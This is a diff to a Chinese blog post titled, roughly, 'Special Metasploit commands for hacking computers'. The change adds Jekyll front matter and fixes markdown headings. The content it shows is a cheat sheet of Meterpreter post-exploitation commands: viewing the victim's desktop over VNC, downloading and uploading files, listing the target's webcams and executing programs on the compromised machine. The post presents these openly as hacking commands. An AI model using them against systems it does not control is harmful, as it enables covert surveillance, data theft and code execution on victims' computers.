@@ -1,3 +1,10 @@
+---
+layout: post
+title: '在Msf黑电脑的专用命令'
+subtitle: 'Metasploit'
+tags: linux 命令 shell
+keywords: Msf Metasploit shell 黑电脑 专用
+---
 ### 使用vnc查看桌面
 ```msf
 run vnc
@@ -34,15 +41,15 @@ shell
 ```msf
 download C:\\path\\to\\file
 ```
-###从kali上传内容到目标机器
+### 从kali上传内容到目标机器
 ```msf
 upload ~/file C:\\path\\up\\
 ```
-- 查看有几个摄像头
+### 查看有几个摄像头
 ```msf
 webcam_list
 ```
--运行程序
+### 运行程序
 ```msf
 execute -f 文件名
 //运行文件
